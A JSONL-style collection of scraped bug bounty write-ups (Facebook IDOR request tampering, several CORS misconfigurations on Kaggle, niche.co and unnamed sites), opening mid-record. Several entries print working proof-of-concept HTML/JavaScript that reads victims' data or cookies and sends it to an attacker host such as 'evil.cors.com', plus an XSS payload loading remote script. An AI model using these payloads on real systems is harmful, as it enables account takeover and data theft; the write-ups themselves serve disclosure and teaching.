/ajax/create/event/submit/?title=[EventName]&description=[Description]&location=...&location_id=....&location_latlong[latitude]=...&location_latlong[longitude]=...&cover_focus[x]=0.5&cover_focus[y]=0.5&only_admins_can_post=true&post_approval_required=false&co_hosts[0]=1008&start_date=11%2F25%2F2019&start_time=7200&end_date=11%2F25%2F2019&end_time=18000&timezone=........ HTTP/1.1 Here, 1008 = User ID of User B Step 7 Replace the value of co_hosts[0] parameter with the User ID of non-friend, i.e. User C (31337) , and then forward the request. Now, the event will be created. Step 8 When you click on \" 1 co-host pending \", you will be able to see that User C has been successfully added as co-host in the event. Step 9 Now, login to User C's account, and you will be able to see a notification telling \" User A made you a host of his/her event [EventName]. \" Exceptional Case If User C has blocked User A, then also this works without any issue, but in that case, User C won't be able to see the event because of User A being blocked, however User A will see User C in pending co-host list. SETUP Requirements: 1. A PC with a web browser 2. An Internet connection, and no geographical restriction on the usage of Facebook 3. Three Facebook accounts; User A, User B and User C. User A = event host = User ID is 1337 User B = User A's friend, who has no role, but will be useful when selecting a co-host for the event so that it can intercepted = User ID is 1008 User C = totally unknown person to both User A and User B, and not friend with any of them = User ID is 31337 Timeline Binit 25 Nov 2019 Submitted the vulnerability report On this date, I submitted the vulnerability report to Facebook. Facebook 28 Nov 2019 Response from Facebook Someone from the Facebook Security Team requested for a little more information mentioning that he/she received an error while trying to reproduc ... See More Binit 28 Nov 2019 My Response I responded back with the requested information and a Proof-of-Concept (PoC) video for the reproduction of the vulnerability. Facebook 04 Dec 2019 Response from Facebook Someone from the Facebook Security Team requested me to provide the test account User IDs and their credentials used for the reproduction of the ... See More Binit 04 Dec 2019 My Response I responded back with the requested information. Facebook 07 Dec 2019 Response from Facebook Someone from the Facebook Security Team requested for more information regarding the vulnerability report. Binit 07 Dec 2019 My Response I provided the requested information as a response to the report. Facebook 10 Dec 2019 Response from Facebook Someone from the Facebook Security Team responded back with the exact error he/she received in the HTTP response of the modified request while tr ... See More Binit 11 Dec 2019 My Response I responded back confirming that the vulnerability is still being reproduced on my side, and provided them a new Proof-of-Concept (PoC) video sho ... See More Facebook 14 Dec 2019 Response from Facebook Someone from the Facebook Security Team asked a question to me regarding whether the victim was able to remove themselves as Co-host or not from ... See More Binit 14 Dec 2019 My Response I responded back saying that the victim was unable to reject the request to be added as Co-host, and would be automatically visible to the public ... See More Facebook 18 Dec 2019 Response from Facebook [REPRODUCED] Someone from the Facebook Security Team responded back saying that the information I provided in the last response would be helpful for the team ... See More Binit 18 Dec 2019 My Response I responded back mentioning that I would be looking forward to answering further queries from the Facebook Security Team. Facebook 18 Dec 2019 Response from Facebook [TRIAGED] Someone from the Facebook Security Team responded back with the information that they are sending the vulnerability report to the product team fo ... See More Binit 18 Dec 2019 My Response I responded back saying that I would be looking forward to seeing what the product team had to say regarding the vulnerability report. Binit 08 Jan 2020 My Response I requested the team to let me know if there is anything new regarding the vulnerability report. Facebook 10 Jan 2020 Response from Facebook Someone from the Facebook Security Team responded back mentioning that they would notify me as soon as a change takes place regarding the vulnera ... See More Binit 10 Jan 2020 My Response I responded back mentioning that I wold be looking forward to being notified about any changes that would take place regarding the vulnerability ... See More Facebook 21 Jan 2020 Response from Facebook [PATCHED] Someone from the Facebook Security Team responded back mentioning that they have looked into the issue and believe that the vulnerability had bee ... See More Facebook 24 Jan 2020 Response from Facebook [REWARDED] The Facebook Security Team responded back regarding the decision to award me a bounty of $750, and also stated a short description about the vuln ... See More Binit 24 Jan 2020 My Response I responded back with a very long message, starting with my thanks given to the Facebook Security Team, then about sharing my happiness of being ... See More Facebook 28 Jan 2020 Response from Facebook Someone from the Facebook Security Team responded back appreciating my response and kind words, and left a message regarding the name to be inclu ... See More Binit 28 Jan 2020 My Response I responded back twice with a little more information regarding the name to be included in the Thanks page. Facebook 06 Feb 2020 Response from Facebook Someone from the Facebook Security Team responded back stating that he/she has updated their hall of fame page as per my request. Binit 06 Feb 2020 My Response I responded back stating about being able to see the inclusion of my name in the Thanks page of 2019. VALID General Info Introduction Description Impact Steps Step 1 Step 2 Step 3 Step 4 Step 5 Step 6 Step 7 Step 8 Step 9 Other Info Exceptiona ... SETUP Timeline Submitted ... Response f ... My Respons ... Response f ... My Respons ... Response f ... My Respons ... Response f ... My Respons ... Response f ... My Respons ... Response f ... My Respons ... Response f ... My Respons ... My Respons ... Response f ... My Respons ... Response f ... Response f ... My Respons ... Response f ... My Respons ... Response f ... My Respons ... Show All Images ×"}
{"source_url": "https://bugreader.com/testgrounds@deleting-anyones-video-poll-175", "title": "Deleting Anyone's Video Poll | Bugreader", "friendly_explanation": "This is a bug bounty writeup from https://bugreader.com/testgrounds@deleting-anyones-video-poll-175. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nDeleting Anyone's Video Poll | Bugreader Bugreader Reports Home Reports Social Researchers Login Register Dan Melamed Published On: 25 Apr 2020 Deleting Anyone's Video Poll IDOR Facebook | Web --- MEDIUM VALID Description I have discovered a vulnerability in Facebook's new feature that allows you to add a poll to a Facebook video. Impact By exploiting this vulnerability, an attacker can delete a poll that belongs to another user's video without authorization. Reproduction Steps Step 1 Upload a video to a Facebook page Step 2 In the video editing page, go to the Polls tab and choose to create a new poll. Then submit the video. Step 3 Go back and edit the video. Delete a poll and before hitting Save, intercept the request with a tool such as Burpsuite Step 4 A POST request will be sent to /video/edit/dialog/save/?v=(VIDEO ID)&av=(PAGE ID) Step 5 The vulnerable parameter in this POST request is: deleted_poll_ids[0] = (POLL ID) Step 6 Replace your (POLL ID) with the victim's video poll id Step 7 Submit the request. The poll is now successfully deleted from the victim's video. Timeline Dan 01 Nov 2018 Initial Report Facebook 02 Nov 2018 Reproduced and Triaged Facebook 06 Nov 2018 Fixed Facebook 06 Nov 2018 Bounty Awarded VALID General Info Description Impact Steps Step 1 Step 2 Step 3 Step 4 Step 5 Step 6 Step 7 Timeline Initial Re ... Reproduced ... Fixed Bounty Awa ... Show All Images ×"}
{"source_url": "https://medium.com/@jayateerthag/cors-bug-on-googles-404-page-rewarded-2163d58d3c8b", "title": "CORS bug on GOOGLE’s 404 page REWARDED!!! | by Jayateertha Guruprasad | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@jayateerthag/cors-bug-on-googles-404-page-rewarded-2163d58d3c8b. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nCORS bug on GOOGLE’s 404 page REWARDED!!! | by Jayateertha Guruprasad | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in CORS bug on GOOGLE’s 404 page REWARDED!!! Jayateertha Guruprasad 3 min read · Apr 21, 2020 -- 1 Listen Share This is a story of CORS bug that I found in one of Google’s aquisition -Kaggle,Where I got rewarded for CORS bug in 404 page. One fine day I was looking at one of the aquisitions of Google-(Kaggle),Kaggle is used worldwide by Machine Learning community and is pretty famous. I tried looking for CSRF bugs all over website but everything went in vain.I also searched for CORS misconfigurations but couldn’t find anything useful. I visited a 404 page accidentally and looked at it’s source code — It had a script tag whose body contained AntiForgery token which is the same token sent as X-XSRF-TOKEN in all the requests ,This is the CSRF token which is sent as headers in all the sensitive endpoints. antiForgeryToken leaked via CORS misconfig in 404 page I changed the origin header of 404 page to mydomain.tld then replayed the request and got the response — The header Access-Control-Allow-Origin and Access-Control-Allow-Credentials was set to mydomain.tld and True respectively.This means any other 3rd party domain is able to get and view response from Kaggle.com.This only happens in the 404 page and is a CORS misconfig in 404 page only!!! I quickly generated a POC ,which contained 2 parts : Get User specific Kaggle CSRF TOKEN from the 404 page. Using the CSRF Token from recieved from above to generate a API key on behalf of user. Press enter or click to view image in full size Generate API KEY on begalf of user using CORS and CSRF bugs combined. I then reported the GoogleVRP team about this incident with this POC and got rewareded with $$$ ,This time it was lower amount.A bug on Google’s aquisition is rewarded relatively lower compared to a bug on Google. The GoogleVRP platform is always very friendly and is a great one for security researchers like me.I recommend everyone to try researching in this great Platform. I would also like to mention and Thank about the GoogleVRP team’s great decision which benefits most of the Google security researchers community at this crucial COVID-19 time — https://security.googleblog.com/2020/04/research-grants-to-support-google-vrp_20.html Liked my article ? Follow me on twitter ( @jayateerthaG ) and medium for more content about bugbounty, Infosec, cybersecurity and hacking. Incase You Loved this Article or learnt anything new, Please Consider supporting me which will be encouraging for writing more great and quality articles as this one. Click here to support the writer . Click here to support the writer. Bug Bounty Security Infosec Google Kaggle -- -- 1 Written by Jayateertha Guruprasad 383 followers · 39 following I get paid for breaking things ! Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@saadahmedx/bypassing-cors-13e46987a45b", "title": "Bypassing CORS. Hello friends this write-up is about… | by Saad Ahmed | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@saadahmedx/bypassing-cors-13e46987a45b. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nBypassing CORS. Hello friends this write-up is about… | by Saad Ahmed | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Bypassing CORS Saad Ahmed 2 min read · Aug 1, 2019 -- Listen Share Hello friends this write-up is about how I bypassed the CORS validation. Let assume the website name redact.com. Simply I logged into the website checked for CSRF attack but there was a Current Password pram which means if I am able to bypass, there is a CSRF protection. I still need the victim’s current password to exploit it Then I saw.. Access-Control-Allow-Origin: https://redact.com Access-Control-Allow-Credentials: true I tried to set the attacker.com in the Origin header but didn’t worked out I tried by adding another Origin header it also failed basically the server was checking the Origin header value like this Press enter or click to view image in full size So we can simply trick the server to bypass that validation by setting the Origin header value to redact.com.attacker.com. Press enter or click to view image in full size Simply tried this on the redact.com & it worked. Press enter or click to view image in full size Loading the Account-Detail page from Evil origin to steal the information Press enter or click to view image in full size Send that fetch request to steal the account information page & display it on the evil.com Press enter or click to view image in full size Boom data steal I hope you guys like it. ./LOGOUT JavaScript -- -- Written by Saad Ahmed 636 followers · 1 following No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/japzdivino/bypass-hackerone-2fa-requirement-and-reporter-blacklist-46d7959f1ee5", "title": "Bypass HackerOne 2FA requirement and reporter blacklist | by Japz Divino | InfoSec Write-ups", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/japzdivino/bypass-hackerone-2fa-requirement-and-reporter-blacklist-46d7959f1ee5. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nBypass HackerOne 2FA requirement and reporter blacklist | by Japz Divino | InfoSec Write-ups Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in InfoSec Write-ups · Follow publication A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow publication Member-only story Bypass HackerOne 2FA requirement and reporter blacklist Japz Divino 4 min read · Oct 31, 2018 -- 6 Share Severity: Medium (5.0) — High (7.1) Weakness: Improper Authorization Bounty: $10,000 Summary: First, the initial submission got a bounty of $2,500. But while HackerOne was doing their Root Cause Analysis (RCA) of my report submission, they have stumbled upon another vulnerability with High severity. Since my submission gives them a nudge in the right direction, they rewarded me another $7,500 for the increase scope of finding. Research: My routine when i am hunting on HackerOne main platform is always checking if they have new incoming feature, And i saw that there is beta feature called Embedded Submission Form which enables hackers to Anonymously submit reports without having to create an account on HackerOne. For additional information. Learn more here . Now, with that new feature i have found an Improper Authorization bug that bypasses the 2 security features of HackerOne for the bug bounty programs. Bypass 2FA requirements when submitting new reports to a program. Learn more here . Bypass hacker blacklisted by a program ( when a program does not want to receive report from specific hackers ). Learn more here . Bypass 2FA requirements when submitting new reports to a program -- -- 6 Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow Written by Japz Divino 1.3K followers · 142 following OSCP | CCBH | Bug Bounty Hunter Responses ( 6 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@nahoragg/a-simple-cors-misconfig-leaked-private-post-of-twitter-facebook-instagram-5f1a634feb9d", "title": "A Simple CORS Misconfig Leaked Private Post Of Twitter, Facebook & Instagram | by Rohan Aggarwal | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@nahoragg/a-simple-cors-misconfig-leaked-private-post-of-twitter-facebook-instagram-5f1a634feb9d. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nA Simple CORS Misconfig Leaked Private Post Of Twitter, Facebook & Instagram | by Rohan Aggarwal | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in A Simple CORS Misconfig Leaked Private Post Of Twitter, Facebook & Instagram Rohan Aggarwal 3 min read · Jan 20, 2019 -- Listen Share Press enter or click to view image in full size Hey Everyone, this is my first story on Medium(one of my friend told me how easy and productive Medium is). If you want to read my previous ones, have a look here at my personal blog. So you might have reached here thinking it’s a big & complex hack but believe me it’s nothing. It’s a very simple misconfiguration of Cross-Origin Resource Sharing (CORS) on one of Twitter’s product called niche . For Understanding and exploiting CORS, read this awesome blog by @albinowax To give a little background of niche, it’s a platform for creators to increase their social media presence by sharing there work(Pics, videos and other stuff). So whats the important asset here : Creators Work - Their Images & Videos. Another great feature of niche is that you can sync your posts from different social media platforms like Facebook, Twitter, Instagram etc. Isn’t that heaven for creators, all of their private work at single place. If you noticed the word “private” in the above line, than you do think like a hacker. Yes, niche also syncs private posts from all these social platforms(It does ask while connecting your other social platforms during OAuth). After seeing that, i knew it would be great if we can somehow see other users private posts from social media through niche. So i tried for doing horizontal privesc but no luck. After going through request in burp history, i saw in response “ Access-Control-Allow-Origin: https://niche.co & Access-Control-Allow-Credentials: true\". So tried exploiting by sending custom Origin header in request and found that the server was only checking whether “//niche.co” was in Origin header. So if Origin : https://evil.co , Access-Control-Allow-Origin : https://niche.co But if Origin: https://niche.co.evil.net , Access-Control-Allow-Origin : https://niche.co.evil.net . That’s it! Press enter or click to view image in full size CORS Misconfig Quickly went to the page where all synced photos from other social media were fetched and that was vulnerable as well, basically whole site was vulnerable. It even had an api endpoint which i found using fuzzing and which wasn’t used in whole site(maybe for dev or legacy) and didn’t even had a documentation but it did displayed all the methods that can be used during hit n trial. Combining vulnerable api and site, i can steal any information about the other users using CORS(Images, email id, bio, profile info, CSRF tokens etc). So made a simple POC that looked like this: <html> <body> <button type='button' onclick='cors()'>CORS</button> <p id='demo'></p> <script> function cors() { var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.readyState == 4 && this.status == 200) { var a = this.responseText; // Sensitive data from niche.co about user account document.getElementById(\"demo\").innerHTML = a; xhttp.open(\"POST\", \"http://evil.cors.com\", true);// Sending that data to Attacker's website xhttp.withCredentials = true; console.log(a); xhttp.send(\"data=\"+a); } }; xhttp.open(\"GET\", \"https://www.niche.co/api/v1/users/*******\", true); xhttp.withCredentials = true; xhttp.send(); } </script> </body> </html> Hosted on domain niche.co.evil.net (locally) and when someone visits it and if they are logged in to niche, all of their sensitive info from niche.co will be forwarded to my domain. That’s it, a simple CORS misconfig with big impact yet Twitter didn’t rewarded since niche domain wasn’t eligible for bounty(can’t argue). But hey, Twitter HOF for few hours of work…..i’ll take it! When the hackerone report was disclosed, many questioned why i did it for free? but at the end i know i learned a lot about CORS, same origin policy, how exactly it works on different browsers. It was a great learning experience and that’s what matters to me. YOUR MONEY CAN BE INFLATED AWAY BUT YOUR KNOWLEDGE CANNOT. If you found this post useful in anyway, make it useful for others as well by sharing. More coming. Get Your Applications Tested Today at DefCore Security Bug Bounty Cors Infosec Twitter Security -- -- Written by Rohan Aggarwal 444 followers · 1 following AppSec | BugBounty | Speaker | Game Hacking | Founder at Defcore Security No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@osamaavvan/cors-to-csrf-attack-c33a595d441", "title": "CORS To CSRF Attack. This writeup is about the CORS… | by Osama Avvan | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@osamaavvan/cors-to-csrf-attack-c33a595d441. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nCORS To CSRF Attack. This writeup is about the CORS… | by Osama Avvan | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in CORS To CSRF Attack Osama Avvan 2 min read · Jun 27, 2019 -- Listen Share This writeup is about the CORS Misconfiguration by which I was able to perform a CSRF attack to change other users account Info. The target let’s just say it was named redact.com was sending a PUT request to the server for updating User Information like Address, Name, etc. An Origin Header was also sent in the request Origin: redact.com which was reflected in the Response and the Access-Control-Allow-Credentials was set to True. Which means that cookies can be sent along with the request. I tried to change the Origin Header value to evil.com and then redact.com.evil.com but both were rejected. But sending the Origin : evil . redact.com worked which means that sub domain of redact.com can send requests to its API. Press enter or click to view image in full size Now I needed an XSS on one of its subdomains to send the PUT request to the Server, luckily I got an XSS on help.redact.com. But it wasn’t enough an enctyptedMembershipNumer param was sent along with the PUT request to identify the user. After looking into the Cookies of redact.com I found that the enctyptedMembershipNumer was saved in a cookie with a name prop_29 which was scoped to the . redact.com the dot, in the beginning , means that this cookie can be accessed from its subdomains. So to extract that Cookie I wrote a JS code. function getCookie(name) { var match = document.cookie.match(new RegExp(‘(^| )’ + name + ‘=([^;]+)’)); if (match) return match[2]; } Now the complete code to get the enctyptedMembershipNumer and to send the PUT request. function getCookie(name) { var match = document.cookie.match(new RegExp(‘(^| )’ + name + ‘=([^;]+)’)); if (match) return match[2]; } cook = getCookie(“prop_29”) data = {“member”:{“mailingAddress”:{“addressLineOne”:”Account Hacked”,”city”:”NEW Port”,”stateOrProvinceCode”:”NY”,”postalCode”:”20001\",”email”:” hacked@gmail.com ”,”countryCode”:”US”}}} fetch(` https://www.redact.com/api/node/vivaldi/v1/account/primary-contact?encryptedMembershipNumber=${cook}` , {method: “PUT”, credentails: “include”, body: JSON.stringify(data)}) I created a JS file and uploaded the code on my server to use in the XSS payload. Final Payload: https://help.redact.com/app/answers/list?searchTerm=<svg onload=script=document[‘createElement’](‘script’);script[‘src’]=’https:&#47;&#47;osamaavvan&#46;000webhostapp&#46;com&#47;a&#46;js’;document[‘head’][‘appendChild’](script);> The . and // were removed from the Payload by the XSS filter so I converted them to their respective HTML entities. Thank You for Reading. 📝 Read this story later in Journal . 👩‍💻 Wake up every Sunday morning to the week’s most noteworthy stories in Tech waiting in your inbox. Read the Noteworthy in Tech newsletter . JavaScript Bug Bounty Bugcrowd Security Researchers -- -- Written by Osama Avvan 1.1K followers · 0 following Security Researcher, ❤️ To Code. Find me at: https://twitter.com/osamaavvan No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@saamux/full-account-takeover-through-cors-with-connection-sockets-179133384815", "title": "Full Account Takeover through CORS with connection Sockets | by Samuel | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@saamux/full-account-takeover-through-cors-with-connection-sockets-179133384815. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nFull Account Takeover through CORS with connection Sockets | by Samuel | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Full Account Takeover through CORS with connection Sockets Samuel 6 min read · Jan 25, 2018 -- 3 Listen Share Hello guys , I’ll share with you an interesting bug in a private program of HackerOne. I had arrived to my house on Friday and received an invitation from HackerOne to join in private program, immediately started doing recognition on the platforms of the program, well, I found an interesting website where had a good bugs (IDOR, CSRF), however, I wanted looking for the biggest bug in the website, so, I tried to exploit a different logical flaws, some SSRF with XSPA, but I didn’t succeed :(. Once the whole website was mapped, I tried to see if I could exploit a CORS type bug (if you want to learn about CORS, you could read this article https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS ). When I made a request with a different Origin, I got the following: Request curl -v -X GET http://privatewebsite.com -H ‘Origin: http://evilwebsite.com’ Response HTTP/1.1 200 OK Cache-Control: no-store, no-cache, no-transform, must-revalidate, max-age=0 Access-Control-Allow-Credentials: true Access-Control-Allow-Origin: http://evilwebsite.com Vary: Origin Content-Type: application/javascript; charset=UTF-8 Date: Wed, 24 Jan 2018 21:56:33 GMT Connection: close As you can see, the website was vulnerable to CORS, since it allowed a connection from another source and also returned the header Access-Control-Allow-Credentials : true which allows exploitation to be successful. Then, I started to create the exploit, but I realized that every time I tried to extract anything from the site, it was not possible, since connections were being made by sockets that only worked once. For example, I made a request Press enter or click to view image in full size Press enter or click to view image in full size First Response When I tried to perform this request again with the same URI, the following happened: Press enter or click to view image in full size As you can see, it is not possible to reuse the same URL, or if it is true, if it was possible, but you had to wait about 10 minutes for that socket connection to die to be able to use it again, and therefore that does not make sense (if we put ourselves on the attacker’s side). Then, it occurred to me that modifying the URI by any other value, it was possible to use the socket again as a new one. For example, Socket Used http://privatewebsite.com/sockjs/669/lsbw5zgh/xhr I changed the URI http://privatewebsite.com/sockjs/123/lsbwabcd/xhr New sockect accepted :). Until then, he had already managed to exploit the CORS, since I could generate any URI and send it through CORS to the victim, and this person when opening the link, could have captured the information of his session. I continued studying the behavior of the website, and I noticed something very interesting, when I entered any resource on the website, 5 requests were loaded by Sockets, which were related to each other. Press enter or click to view image in full size Interesting Request In the fifth request you can see a lot of confidential information about the user, among them, the user, the session token (if this was captured an attacker could obtain the session of a user.) Therefore, an exploit should be created in CORS which I would have to do each of these 5 requests until I get to the last one and that way I could get that information from the user.You’ll be wondering, why did not you just do a CORS exploit with just that request? It happens that each of these requests is linked to each other and if only the last one was executed, the necessary verification of the other 4 request would not be carried out. First request Press enter or click to view image in full size Press enter or click to view image in full size Second request Press enter or click to view image in full size Press enter or click to view image in full size Third Request Press enter or click to view image in full size Press enter or click to view image in full size Fourth Request Press enter or click to view image in full size The information by POST, could be captured by the attacker through various types of MITM attacks, Phishing, etc. (This is because the website does not have an SSL certificate). Fifth Request Press enter or click to view image in full size Press enter or click to view image in full size If it has not been very clear, I will explain it again, when you enter any resource on the website, these 5 requests are loaded through the socket, which complement each other, therefore what I did next was create an exploit in CORS which replicates each of these requests, this is sent to the victim and later it is possible to obtain their information. exploitCORS.html <!DOCTYPE html> <html> <head><title>Exploiting CORS</title></head> <body> <center> <h1>Getting your information through CORS</h1> <button type=\"button\" onclick=\"ProcessUrls()\">Exploit</button> </div> <script type=\"text/javascript\"> var cont = 0; var requests = new Array(); function ProcessUrls() { requests = new Array(); var urls = new Array('http://privatewebsite.com/sockjs/203/jb93ne78/xhr','http://privatewebsite.com/sockjs/203/jb93ne78/xhr_send','http://privatewebsite.com/sockjs/203/jb93ne78/xhr', 'http://privatewebsite.com/sockjs/203/jb93ne78/xhr_send','http://privatewebsite.com/sockjs/203/jb93ne78/xhr'); for(i=0;i<urls.length;i++) { requests.push(new ProcessUrl(urls[i])); } } function ProcessUrl(url) { cont+=1; if (cont == 2 ){ var http = new XMLHttpRequest(); http.open(\"POST\", url, true); http.withCredentials = true; http.onreadystatechange = function() { if (http.readyState == 4 && http.status == 204) { http.responseText } }; http.setRequestHeader(\"Content-Type\", \"text/plain;charset=UTF-8\"); http.send('[\"{\\\\\"msg\\\\\":\\\\\"connect\\\\\",\\\\\"version\\\\\":\\\\\"1\\\\\",\\\\\"support\\\\\":[\\\\\"1\\\\\",\\\\\"pre2\\\\\",\\\\\"pre1\\\\\"]}\"]'); } else if (cont == 4 ){ var http = new XMLHttpRequest(); http.open(\"POST\", url, true); http.withCredentials = true; http.onreadystatechange = function() { if (http.readyState == 4 && http.status == 204) { http.responseText } }; http.setRequestHeader(\"Content-Type\", \"text/plain;charset=UTF-8\"); http.send('[\"{\\\\\"msg\\\\\":\\\\\"method\\\\\",\\\\\"method\\\\\":\\\\\"login\\\\\",\\\\\"params\\\\\":[{\\\\\"resume\\\\\":\\\\\"abcabcabcabcabcabcabcabcabcabcabcabcabcabca\\\\\"}],\\\\\"id\\\\\":\\\\\"1\\\\\"}\",\"{\\\\\"msg\\\\\":\\\\\"sub\\\\\",\\\\\"id\\\\\":\\\\\"hihihihihihihihi\\\\\",\\\\\"name\\\\\":\\\\\"meteor.loginServiceConfiguration\\\\\",\\\\\"params\\\\\":[]}\",\"{\\\\\"msg\\\\\":\\\\\"sub\\\\\",\\\\\"id\\\\\":\\\\\"yzyzyzyzyzyzyzyzy\\\\\",\\\\\"name\\\\\":\\\\\"meteor_autoupdate_clientVersions\\\\\",\\\\\"params\\\\\":[]}\",\"{\\\\\"msg\\\\\":\\\\\"sub\\\\\",\\\\\"id\\\\\":\\\\\"efefefefefefefefe\\\\\",\\\\\"name\\\\\":\\\\\"hooks\\\\\",\\\\\"params\\\\\":[]}\"]'); } else if (cont == 5) { var http = new XMLHttpRequest(); http.open(\"POST\", url, true); http.withCredentials = true; http.onreadystatechange = function() { if (http.readyState == 4 && http.status == 200 || http.readyState == 4 && http.status == 204 ) { alert(http.responseText) } }; http.send(); } else { var http = new XMLHttpRequest(); http.open(\"POST\", url, true); http.withCredentials = true; http.onreadystatechange = function() { if (http.readyState == 4 && http.status == 200 || http.readyState == 4 && http.status == 204 ) { http.responseText } }; http.send(); } } </script> The exploit will perform the 5 socket request, therefore when executing this you get the following Press enter or click to view image in full size Press enter or click to view image in full size It’s working. Through this, you could use the session token to take control of another user’s account :D. The vulnerability was accepted by the program and I was rewarded :). Thanks @saamux Bug Bounty -- -- 3 Written by Samuel 616 followers · 10 following Responses ( 3 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://smaranchand.com.np/2019/05/an-unexploited-cors-misconfiguration-reflecting-further-issues/", "title": "An unexploited CORS misconfiguration reflecting further issues. – Smaran Chand", "friendly_explanation": "This is a bug bounty writeup from https://smaranchand.com.np/2019/05/an-unexploited-cors-misconfiguration-reflecting-further-issues/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nAn unexploited CORS misconfiguration reflecting further issues. – Smaran Chand Skip to content Smaran Chand Menu Home About Me Search for: May 27, 2019 An unexploited CORS misconfiguration reflecting further issues. Until and unless an issue or loophole present in the application is not exploited and made impactful in a real-life scenario, the term “vulnerability” doesn’t suit as the perfect noun for it. The same scenario transpired with me I am not that usual/dedicated bughunter. Actually, I am more into pentesting because I am working for one of the top cybersecurity company in Nepal. I love to intercept network traffic of mobile apps :D. I picked up a random program from bugcrowd, downloaded the scope application fired up my best tool Frida 😀 and started intercepting the network traffic. I checked for CRLF, Host Header Injection, HTTP Response Splitting and other vulnerabilities relating with headers Because Headers are the cool things, I call them messengers 😀 without them communication is not possible, although I didn’t find anything there. Finally, I attempted to add the “Origin” header with my domain and it accepted the origin and reflected my domain in response. I double checked and found that “Access-Control-Allow-Credentials” header was present as well. 😀 Testing CORS miss-configuration So Vulnerability = Confirmed ! but Exploitation = ??? Yes, the exploitation was a really big challenge for me because it’s a mobile app API and I looked the entire scope of a program and found that the API is not used anywhere in the web platform. 🙁 I tried opening the in-app browser as well, it was little tricky to open links on the in-app browser because there wasn’t an option to feed the URL and it successfully didn’t work. 🙁 So finally I decided to make a working POC although we cannot exploit it properly. It can be called as an ideal situation or with high AC (attack complexity). I started firefox browser and copied the cookies from burpsuite and injected those cookies to the web browser. Injecting cookies in web browser. Reason: Because the cookies required for making API request are not present in the web browser. I made CORS exploit PoC and uploaded it to my server as cors.html file. <html> <center> <h2>Exploiting CORS XXX</h2> </center> <div id=\"test\"> <button type=\"button\" onclick=\"cors()\">Exploit</button> </div> <script> function cors() { var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.readyState == 4 && this.status == 200) { document.getElementById(\"test\").innerHTML = alert(this.responseText); } }; xhttp.open(\"GET\", \"https://api.vulnerable-domain.com/2.2/account\", true); xhttp.withCredentials = true; xhttp.send(); } </script> </html> As a result, the account’s sensitive information popped up within the origin of my domain which results in the existence of the issue. CORS in different origin. After submitting the report in good explanation they replied this. Reply from program’s developer. The developer said that my report pointed out a serious issue in the framework where they have implemented the same API. 🙂 As of now, the issue is still unresolved and they are sending me a swag T-shirt. I can’t stop myself to further dig into the same program. Thanks for reading, share if you liked it 🙂 Reference: http://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/ Bug Bounty Post navigation Older post How I acquired $XXX bounty by investing 99 cents Newer post Parameter Pollution issue in API resulting $XXX 5 Comments Ved says: June 6, 2019 at 1:46 pm Very Cool write-up dude. If I’m not wrong, maybe you have disclosed program’s name in last screenshot. Reply smaran.chand says: June 7, 2019 at 3:00 pm First of all i would like to thank you very much for reading my blog and i would like to express gratitude for pointing out the issue. I just updated it. Reply Ranjan Lamichhane says: April 11, 2020 at 3:39 am Wow Bro..Your writeups are great Reply smaran.chand says: April 11, 2020 at 9:01 am Thanks Reply Pingback: These Bug Bounty Writeups will Change Your Life - PrimeHackers Leave a Comment Cancel reply Your email address will not be published. Required fields are marked * Comment * Name * Email * Website Save my name, email, and website in this browser for the next time I comment. Notify me of follow-up comments by email. Notify me of new posts by email. Δ Facebook | Twitter"}
